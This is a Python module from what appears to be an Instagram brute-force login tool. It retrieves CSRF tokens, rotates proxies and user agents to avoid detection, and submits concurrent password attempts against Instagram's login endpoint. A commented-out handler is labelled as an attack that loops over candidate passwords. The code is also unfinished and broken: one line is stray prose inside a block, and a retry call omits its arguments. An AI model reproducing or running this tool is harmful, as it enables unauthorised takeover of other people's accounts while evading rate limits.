from __future__ import absolute_import

import collections
import contextlib
import random
import logging

import aiohttp
import asyncio
import concurrent.futures
import requests

from app import settings
from app.lib import exceptions
from app.lib.utils import auto_logger, format_proxy, get_token_from_response
from app.lib.models import InstagramResult

from app.handlers import AysncExceptionHandler, SyncExceptionHandler


"""
TODO
-----
Introduce timeout here if we cannot retrieve the token - if there is a connection
error we might not retrieve a token for any of the proxies.

We might want to try to refresh proxies after they are retrieved from
the queue if the request is successful.

NOTES
------
We can use the following url to make sure that requests are using the proxy
correctly:
future = session.get('https://api.ipify.org?format=json')
"""


TokenTaskContext = collections.namedtuple('TokenTaskContext',
    'name proxy')
LoginTaskContext = collections.namedtuple('LoginTaskContext',
    'name proxy token password')


class request_handler(object):

    def __init__(self, global_stop_event, queues):
        self.global_stop_event = global_stop_event
        self.silenced = False
        self.user_agent = random.choice(settings.USER_AGENTS)
        self.stop_event = asyncio.Event()
        self.queues = queues

    async def _cancel_remaining_tasks(self, futures):
        tasks = [task for task in futures if task is not
             asyncio.tasks.Task.current_task()]
        list(map(lambda task: task.cancel(), tasks))
        await asyncio.gather(*tasks, return_exceptions=True)

    def _headers(self):
        headers = settings.HEADER.copy()
        headers['user-agent'] = self.user_agent
        return headers

    # @contextlib.asynccontextmanager
    # async def protected_event(self, stop_event=None, log=None):
    #     log = log or logging.getLogger('Protected Event')
    #     while not stop_event.is_set():
    #         yield

    @contextlib.asynccontextmanager
    async def silence(self):
        try:
            self.silenced = True
            yield
        finally:
            self.silenced = False


class token_handler(request_handler):

    # We are going to have to adjust these probably - it might take more than
    # 10 attempts to retrieve a result if we have bad proxies.
    ATTEMPT_LIMIT = settings.TOKEN_ATTEMPT_LIMIT

    def _get_token_from_response(self, response):
        token = get_token_from_response(response)
        if not token:
            raise exceptions.TokenNotInResponse()
        return token

    async def task_generator(self, log, **context):
        index = 0
        while not self.stop_event.is_set() and index <= self.ATTEMPT_LIMIT:
            proxy = await self.queues.proxies.get_best()
            index += 1

            _context = TokenTaskContext(
                name=f'Token Task {index}',
                proxy=proxy,
                **context,
            )

            log.debug("Submitting Task", extra={
                'task': _context.name,
            })

            yield _context


class async_token_handler(token_handler):

    async def request(self, session, context, retry=0):

        # Autologger not working because of keyword argument
        log = logging.getLogger('Token Task')

        extra = {
            'task': context.name,
            'proxy': context.proxy,
        }

        if not self.silenced:
            log.info('Sending GET Request', extra=extra)

        try:
            # We have to figure out if we have to use the ProxyConnector and
            # initialize each session with a different proxy, or if we can
            # provide the proxy to the call, because doing that would allow us
            # to not recreate the session for each proxy.
            async with session.get(
                settings.INSTAGRAM_URL,
                raise_for_status=True,
                headers=self._headers(),
                proxy=format_proxy(context.proxy)
            ) as response:
                # Raise for status is automatically performed, so we do not have
                # to have a client response handler.
                try:
                    token = self._get_token_from_response(response)
                except exceptions.TokenNotInResponse as e:
                    if not self.silenced:
                        log.warning(e, extra=extra)
                    return None
                else:
                    self.queues.proxies.good.put_nowait(context.proxy)
                    return token

        except (aiohttp.ClientProxyConnectionError, aiohttp.ServerTimeoutError) as e:
            retry += 1
            if retry > 5:
                log.debug('Retrying...', extra={'task': context.name})
                if not self.silenced:
                    log.error(e, extra=extra)
                return None

            # Session should still be alive.
            await asyncio.sleep(1)
            return await self.request(retry=retry)

        except aiohttp.ClientError as e:
            if not self.silenced:
                log.error(e, extra=extra)

        except asyncio.CancelledError:
            return None

        except Exception as e:
            raise exceptions.FatalException(
                f'Uncaught Exception: {str(e)}', extra=extra)

    @auto_logger("Getting Token")
    async def __call__(self, log):
        """
        Asyncio Docs:

        asyncio.as_completed

            Run awaitable objects in the aws set concurrently. Return an iterator
            of Future objects. Each Future object returned represents the earliest
            result from the set of the remaining awaitables.

            Raises asyncio.TimeoutError if the timeout occurs before all Futures are done.

        TCPConnector

            keepalive_timeout (float) – timeout for connection reusing aftet
            releasing
            limit_per_host (int) – limit simultaneous connections to the same
            endpoint (default is 0)
        """
        futures = []

        # ClientSession should remain open in between futures, so looping over
        # the context within the session shouldn't make a difference.
        timeout = aiohttp.ClientTimeout(total=settings.DEFAULT_TOKEN_FETCH_TIME)
        conn = aiohttp.TCPConnector(
            ssl=False,
            keepalive_timeout=3.0,
            enable_cleanup_closed=True,
        )

        async with aiohttp.ClientSession(connector=conn, timeout=timeout) as session:
            async for context in self.task_generator(log):
                log.debug("Submitting Task", extra={
                    'task': context.name
                })
                if not self.stop_event.is_set():
                    task = asyncio.ensure_future(self.request(session, context))
                    futures.append(task)

            # TODO: Incorporate some type of timeout as an edge cases if None of the
            # futures are finishing.
            for future in asyncio.as_completed(futures, timeout=None):
                earliest_future = await future
                if earliest_future:
                    self.stop_event.set()

                    # Cancel Remaining Tasks - I don't think we need to silence
                    # here, since we have the catch for CancelledError in request.
                    await self._cancel_remaining_tasks(futures)
                    return earliest_future


class futures_token_handler(token_handler):

    # Not sure if this is going to be applicable for asynchronous case.
    THREAD_LIMIT = settings.TOKEN_THREAD_LIMIT

    def _handle_client_response(self, response, log, extra=None):
        extra = extra or {}
        extra.update(response=response)
        try:
            response.raise_for_status()
        except requests.exceptions.HTTPError as e:
            log.warning(e, extra=extra)
            return None
        else:
            try:
                token = self._get_token_from_response(response)
            except exceptions.TokenNotInResponse as e:
                if not self.silenced:
                    log.warning(e, extra=extra)
                return None
            else:
                return token

    @auto_logger("Token Task")
    def request(self, session, context, log):
        """
        TODO: We are going to want to start putting proxies back in the queue
        if they resulted in successful requests.
        """
        extra = {
            'task': context.name,
            'proxy': context.proxy,
        }

        if not self.silenced:
            log.info('Sending GET Request', extra=extra)
        try:
            response = session.get(
                settings.INSTAGRAM_URL,
                headers=self._headers(),
                timeout=settings.DEFAULT_TOKEN_FETCH_TIME,
                proxies={
                    'http': format_proxy(context.proxy),
                    'https': format_proxy(context.proxy, scheme='https'),
                }
            )
        except requests.exceptions.ConnectionError as e:
            if not self.silenced:
                log.error(e, extra=extra)
            return None
        else:
            token = self._handle_client_response(response, log, extra=extra)
            if token:
                self.queues.proxies.good.put_nowait(context.proxy)
            return token

    @auto_logger("Getting Token")
    async def __call__(self, log):
        """
        TODO: We are going to want to start putting proxies back in the queue
        if they resulted in successful requests.
        """
        futures = []

        with concurrent.futures.ThreadPoolExecutor(max_workers=self.THREAD_LIMIT) as executor:
            session = requests.Session()

            async for context in self.task_generator(log, session=session):
                log.debug("Submitting Task", extra={
                    'task': context.name
                })
                token_future = executor.submit(self.request, session, context)

                setattr(token_future, '__context__', context)
                futures.append(token_future)

            for future in concurrent.futures.as_completed(futures):
                log.debug("Finished Task", extra={
                    'task': future.__context__.name,
                    'proxy': future.__context__.proxy,
                })
                result = future.result()
                if result is not None:
                    async with self.silence():
                        self.stop_event.set()
                        executor.shutdown()
                    return result


class login_handler(request_handler):

    # We are going to have to adjust these probably - it might take more than
    # 10 attempts to retrieve a result if we have bad proxies.
    # This might not be as appropriate for async cases.
    ATTEMPT_LIMIT = settings.LOGIN_ATTEMPT_LIMIT

    def __init__(self, user, global_stop_event, queues):
        super(login_handler, self).__init__(global_stop_event, queues)
        self.user = user

    def login_data(self, password):
        return {
            'username': self.user.username,
            'password': password
        }

    def _headers(self, token):
        headers = super(login_handler, self)._headers()
        headers['x-csrftoken'] = token
        return headers

    async def task_generator(self, log, password, **context):
        index = 0
        while not self.stop_event.is_set() and index <= self.ATTEMPT_LIMIT:
            proxy = await self.queues.proxies.get_best()
            index += 1

            _context = LoginTaskContext(
                name=f'Login Task {index}',
                proxy=proxy,
                password=password,
                **context,
            )

            log.debug("Submitting Task", extra={
                'task': _context.name,
            })

            yield _context


class async_login_handler(login_handler):

    def _get_result_from_response(self, response):
        try:
            result = response.json()
        except ValueError:
            raise exceptions.ResultNotInResponse()
        else:
            return InstagramResult.from_dict(result)

    async def request(self, session, context, retry=0):

        # Autologger not working because of keyword argument
        log = logging.getLogger('Login')

        extra = {
            'task': context.name,
            'proxy': context.proxy,
            'token': context.token,
            'password': context.password,
        }

        if not self.silenced:
            log.info('Sending POST Request', extra=extra)

        try:
            # We have to figure out if we have to use the ProxyConnector and
            # initialize each session with a different proxy, or if we can
            # provide the proxy to the call, because doing that would allow us
            # to not recreate the session for each proxy.
            async with session.get(
                settings.INSTAGRAM_LOGIN_URL,
                headers=self._headers(context.token),
                json=self.login_data(context.password),
                timeout=settings.DEFAULT_LOGIN_FETCH_TIME,
                raise_for_status=True,
                proxy=format_proxy(context.proxy)
            ) as response:
                this is where we left off for the login case

        except (aiohttp.ClientProxyConnectionError, aiohttp.ServerTimeoutError) as e:
            retry += 1
            if retry > 5:
                log.debug('Retrying...', extra={'task': context.name})
                if not self.silenced:
                    log.error(e, extra=extra)
                return None

            # Session should still be alive.
            await asyncio.sleep(1)
            return await self.request(retry=retry)

        except aiohttp.ClientError as e:
            if not self.silenced:
                log.error(e, extra=extra)

        except asyncio.CancelledError:
            return None

        except Exception as e:
            raise exceptions.FatalException(
                f'Uncaught Exception: {str(e)}', extra=extra)

    @auto_logger("Asychronous Login")
    async def run(self, token, password, log):
        """
        Asyncio Docs:

        asyncio.as_completed

            Run awaitable objects in the aws set concurrently. Return an iterator
            of Future objects. Each Future object returned represents the earliest
            result from the set of the remaining awaitables.

            Raises asyncio.TimeoutError if the timeout occurs before all Futures are done.

        TCPConnector

            keepalive_timeout (float) – timeout for connection reusing aftet
            releasing
            limit_per_host (int) – limit simultaneous connections to the same
            endpoint (default is 0)
        """
        futures = []

        # ClientSession should remain open in between futures, so looping over
        # the context within the session shouldn't make a difference.
        timeout = aiohttp.ClientTimeout(total=settings.DEFAULT_LOGIN_FETCH_TIME)
        conn = aiohttp.TCPConnector(
            ssl=False,
            keepalive_timeout=3.0,
            enable_cleanup_closed=True,
        )

        async with aiohttp.ClientSession(connector=conn, timeout=timeout) as session:
            async for context in self.task_generator(log, password, token=token):
                log.debug("Submitting Task", extra={
                    'task': context.name
                })
                if not self.stop_event.is_set():
                    task = asyncio.ensure_future(self.request(session, context))
                    futures.append(task)

            # TODO: Incorporate some type of timeout as an edge cases if None of the
            # futures are finishing.
            for future in asyncio.as_completed(futures, timeout=None):
                earliest_future = await future
                if earliest_future:
                    self.stop_event.set()

                    # Cancel Remaining Tasks - I don't think we need to silence
                    # here, since we have the catch for CancelledError in request.
                    await self._cancel_remaining_tasks(futures)
                    return earliest_future


class futures_login_handler(login_handler):
    THREAD_LIMIT = settings.LOGIN_THREAD_LIMIT

    def _get_result_from_response(self, response):
        try:
            result = response.json()
        except ValueError:
            raise exceptions.ResultNotInResponse()
        else:
            return InstagramResult.from_dict(result)

    def _handle_client_response(self, response, log, extra=None):
        extra = extra or {}
        extra.update(response=response)
        try:
            response.raise_for_status()
        except requests.exceptions.HTTPError as e:
            if response.status_code == 400:
                try:
                    result = self._get_result_from_response(response)
                except exceptions.ResultNotInResponse:
                    log.warning(e, extra=extra)
                    return None
                else:
                    return result
            else:
                log.warning(e, extra=extra)
                return None
        else:
            try:
                result = self._get_result_from_response(response)
            except exceptions.ResultNotInResponse:
                log.critical("Unexpected behavior, result should be in response.")
                return None
            else:
                return result

    @auto_logger("Login")
    def request(self, session, context, log):

        extra = {
            'task': context.name,
            'proxy': context.proxy,
            'token': context.token,
            'password': context.password,
        }

        if not self.silenced:
            log.info("Sending POST Request", extra=extra)
        try:
            response = session.post(
                settings.INSTAGRAM_LOGIN_URL,
                headers=self._headers(context.token),
                data=self.login_data(context.password),
                timeout=settings.DEFAULT_LOGIN_FETCH_TIME,
                proxies={
                    'http': format_proxy(context.proxy),
                    'https': format_proxy(context.proxy, scheme='https'),
                },
            )
        except requests.exceptions.ConnectionError as e:
            if not self.silenced:
                log.error(e, extra=extra)
            return None
        else:
            # TODO: For client responses, we might want to raise a harder exception
            # if we get a 403.
            return self._handle_client_response(response, log, extra=extra)

    @auto_logger("Sychronous Futures Login")
    async def synchronous(self, token, password, log):

        session = requests.Session()
        while not self.stop_event.is_set():
            # We probably want this block to run synchronously because this represents
            # a series of attempts for a single password over a range of proxies.
            async for context in self.task_generator(log, password, token=token):
                result = self.request(session, context)
                if result:
                    if result.has_error:
                        log.warning(result.error_message, extra={
                            'token': token,
                            'password': password,
                            'task': context.name,
                        })
                    elif result.conclusive:
                        self.queues.proxies.good.put_nowait(context.proxy)
                        self.stop_event.set()
                        return result

    @auto_logger("Asychronous Futures Login")
    async def asynchronous(self, token, password, log):
        """
        TODO: We are going to want to start putting proxies back in the queue
        if they resulted in successful requests.
        """
        futures = []

        with concurrent.futures.ThreadPoolExecutor(max_workers=self.THREAD_LIMIT) as executor:
            session = requests.Session()

            while not self.stop_event.is_set():
                # We probably want this block to run synchronously because this represents
                # a series of attempts for a single password over a range of proxies.
                async for context in self.task_generator(log, password, token=token):
                    log.debug("Submitting Task", extra={
                        'task': context.name
                    })
                    login_future = executor.submit(self.request, session, context)
                    setattr(login_future, '__context__', context)

                    futures.append(login_future)

                for future in concurrent.futures.as_completed(futures):
                    log.debug("Finished Task", extra={
                        'task': future.__context__.name,
                        'proxy': future.__context__.proxy,
                    })
                    result = future.result()
                    if result:
                        if result.has_error:
                            log.warning(result.error_message, extra={
                                'token': token,
                                'password': password,
                                'task': context.name,
                            })
                        elif result.conclusive:
                            async with self.silence():
                                self.stop_event.set()
                                executor.shutdown()

                            self.queues.proxies.good.put_nowait(future.__context__.proxy)
                            return result


# class futures_multiple_login_handler(login_handler):

#     @auto_logger("Attempting Sync Attack")
#     async def sync(self, token, log):
#         pass

#     @auto_logger("Attempting Async Attack")
#     async def concurrent(self, token, log):
#         futures = []

#         with concurrent.futures.ThreadPoolExecutor(max_workers=self.THREAD_LIMIT) as executor:
#             for password in self.user.get_new_attempts():
#                 password_future = executor.submit(
#                     self.concurrent_attempt_with_password, token, password)
#                 setattr(password_future, '__context__', context)
#                 futures.append(password_future)

#             for future in concurrent.futures.as_completed(futures):
#                 log.debug("Finished Task", extra={
#                     'task': future.__context__.name,
#                     'proxy': future.__context__.proxy,
#                 })
#                 result = future.result()


class Login(object):

    def __init__(self, config, global_stop_event, queues):
        self.global_stop_event = global_stop_event
        self.queues = queues
        self.config = config

    @auto_logger("Login")
    async def login(self, loop, log):
        token = await self.token_handler()
        if token is None:
            raise exceptions.FatalException(
                "The allowable attempts to retrieve a token did not result in a "
                "valid response containing a token.  This is most likely do to "
                "a connection error."
            )

        log.success("Set Token", extra={'token': token})

        # Check if --test was provided, and if so only use one password that is
        # attached to user object.
        # There is no synchronous version of the async login, only the futures
        # login.
        if self.config.futures:
            if self.config.sync:
                method = self.login_handler.synchronous
            else:
                method = self.login_handler.asynchronous
        else:
            method = self.login_handler.run

        result = await method(token, self.user.password)
        if result.authorized:
            log.success('Authenticated')
        else:
            log.success('Not Authenticated')
            print(result.__dict__)

        self.global_stop_event.set()


class AsyncLogin(Login):

    def __init__(self, config, global_stop_event, queues):
        super(AsyncLogin, self).__init__(config, global_stop_event, queues)
        self.login_handler = async_login_handler(config.user, global_stop_event, queues)
        self.token_handler = async_token_handler(global_stop_event, queues)


class FuturesLogin(Login):

    def __init__(self, config, global_stop_event, queues):
        super(FuturesLogin, self).__init__(config, global_stop_event, queues)
        self.login_handler = futures_login_handler(config.user, global_stop_event, queues)
        self.token_handler = futures_token_handler(global_stop_event, queues)
